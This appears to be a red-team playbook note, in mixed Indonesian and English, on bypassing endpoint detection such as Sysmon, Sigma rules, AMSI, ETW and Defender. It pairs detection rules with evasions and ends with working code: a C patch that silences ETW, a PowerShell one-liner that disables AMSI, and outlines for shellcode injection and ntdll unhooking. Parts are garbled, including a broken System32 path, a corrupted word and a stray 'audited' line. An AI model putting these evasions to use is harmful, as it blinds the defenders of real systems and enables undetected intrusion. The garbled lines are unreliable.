---
title: Attack Perspective — Endpoint Detection Playbook (Red Team)
tags:
- attack
- red-team
- endpoint
- edr
- sysmon
- sigma
- detection-bypass
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---

# Endpoint Detection Playbook — Perspektif Penyerang

> Endpoint detection (EDR/AV/Sysmon) = lawan di endpoint. Red team: tahu rule yang dipakai (Sigma/Sysmon) → bypass. Playbook ini dari sisik penyerang: teknik, rule yang nge-trigger, dan bypass-nya.

## 1. Detection Rule vs Bypass

| Rule (Defender) | Trigger | MITRE ID | Bypass | Tool |
|-----------------|---------|----------|--------|------|
| Sysmon Event 1 (process) | New process | T1059 | Direct syscall, PPID spoof | SysWhispers3 |
| Sysmon Event 3 (network) | Connection | T1071 | Domain fronting, in-memory C2 | Redirector |
| Sysmon Event 11 (file create) | Dropped file | T1105 | In-memory download → no disk | DONUT |
| AMSI | Script scan | T1059 | AMSI patch | Custom |
| ETW | Telemetry | T1562 | ETW patch | Custom |
| Sigma rule (cmdline) | Command match | T1059 | Argument obfuscation | Custom |
| Microsoft Defender | Signature/behavior | T1027 | Custom packer | Custom |
| Behavior (beaconing) | Interval pattern | T1071 | Jitter + shaping | Malleable |

## 2. Bypass Chain

```
Payload (in-memory):
  ├── DONUT → shellcode from file (no payload on disk)
  ├── Beacon → reflective load (no exe file)
  └→ No file create → Sysmon 11 blank
    ↓
Execution:
  ├── Direct syscall (NtCreateProcess) → no EDR hook
  ├── PPID spoof (legit parent) → child-parent rule bypass
  └→ Callback → C2 (HTTPS, shaped) → below behavior threshold
    ↓
Post-exploit:
  ├── AMSI patch → PowerShell script → no scan
  ├── ETW patch → no telemetry
  ├── Custom build (mimikatz variant) → no signature
  └→ Timestomp → no timeline
    ↓
Result: All common detection rule → bypassed
```

## 3. Sigma Rule Analysis (Attacker View)

| Sigma Rule | Detection | Bypass |
|-----------|-----------|--------|
| Suspicious Process (rundll32, mshta) | Process name + cmdline | Use alternative LOLBin, custom loader |
| Mimikatz cmdline | "-sekurlsa" | Custom build (no CLI arg) |
| PowerShell encoded | "-enc" | Split, obfuscate, use unmanaged |
| Beaconing (interval) | Connection pattern | Jitter, random session |
| Suspicious DLL load | Loaded module | Reflective load (no disk) |
| Registry persistence | Autostart key | WMI, COM, service |
| Suspicious network | Known C2 IP | Domain fronting, flux |

## 4. Tool Stack

| Tool | Use |
|------|-----|
| **SysWhispers3** | Direct syscall |
| **DONUT** | In-memory shellcode |
| **Cobalt Strike Malleable** | Traffic shaping |
| **Custom packer** | AV evasion |
| **SharpUp/SharpHound** | Recon (post-exploit) |

## 5. Referensi
- SigmaHQ — https://github.com/SigmaHQ/sigma
- Sysmon — https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- EDR Evasion — https://www.outflank.nl/blog/2019/06/19/red-team-tactics-combatting-edr-solutions/
- iRed.Team evasion — https://www.ired.team/offensive-security/defense-evasion

## Konkret — EDR Bypass Payload (Testable)

### Sysmon Evasion

```bash
# Sysmon config: Event ID 1 (ProcessCreate), 8 (RemoteThread), 11 (FileCreate)
# Bypass:
# 1. Process injection tanpa CreateRemoteThread:
#    QueueUserAPC → tidak logged EID 8
#    NtMapViewOfSection → shared memory inject → not EID 8
# 2. Fileless: tidak ada EID 11 (no file drop)
#    Shellcode langsung di memori → VirtualAlloc → Write → CreateThread
# 3. LOLBin: parent = legitimate binary → EID 1 tidak suspicious
#    Parent: explorer.exe → spawn: mshta.exe → payload
```

### ETW Patching

```c
// ETW (Event Tracing for Windows) → real-time event source
// Bypass: patch ntdll!EtwEventWrite → return immediately
//   (no event sent → EDR blind)

// Patch code:
// 1. Find ntdll!EtwEventWrite
// 2. Write RET (0xC3) di first byte
// 3. Now ETW events dropped → EDR blind

// C code:
FARPROC etw = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
*(BYTE*)etw = 0xC3;  // ret
VirtualProtect(etw, 1, old, &old);
```

### AMSI Bypass

```powershell
# AMSI (Anti-Malware Scan Interface) → scan script content sebelum exec
# Bypass: patch amsi.dll!AmsiScanBuffer → return S_OK + no scan

# Reflection-based bypass (no file, no detection):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Hardware bypass (hardwareershell AMSI provider):
# Modify content: split payload → bypass string match
# Base64 encode → AMSI tidak decode (sometimes)
```

### Callback Memory Scan Evasion

```c
// 1. Sleep obfuscation: encrypt shellcode saat idle
//    Saat thread sleep: VirtualProtect → PAGE_NOACCESS → encrypt
//    Saat thread wake: decrypt → PAGE_EXECUTE_READ → run
// 2. Randomize sleep time (jitter) → tidak match C2 beacon pattern
// 3. Unhook ntdll (replace dengan clean copy dari disk)
//    Map ntdll.dll dari C:\Windows\System32
tdll.dll
//    Overwrite .text section → remove EDR hooks
```
---

audited
---
